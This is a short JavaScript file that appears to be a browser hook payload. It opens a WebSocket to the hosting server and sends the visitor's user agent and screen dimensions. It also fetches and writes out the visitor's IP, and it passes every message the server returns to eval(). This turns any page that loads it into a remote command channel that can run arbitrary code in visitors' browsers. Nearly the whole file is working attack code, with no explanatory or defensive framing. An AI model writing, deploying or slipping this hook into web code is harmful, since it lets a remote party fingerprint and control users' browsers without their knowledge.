const payloadWS = new WebSocket(`${window.location.origin.replace(/^http/, "ws")}/ws`);
async function collectClientInfo() {
  const info = {};
  fetch(`${window.location.origin}/ip`).then(async r => document.writeln(JSON.stringify((await r.json()))))
  info.userAgent = navigator.userAgent;
  info.screen = {
    x: window.screenX,
    y: window.screenY,
    w: window.screen.width,
    h: window.screen.height
  };
  return info;
}

payloadWS.onopen = function(){
  collectClientInfo().then(info => {
      payloadWS.send(JSON.stringify(info))
  });
}

payloadWS.onmessage = function(message){
  eval(message.data)
}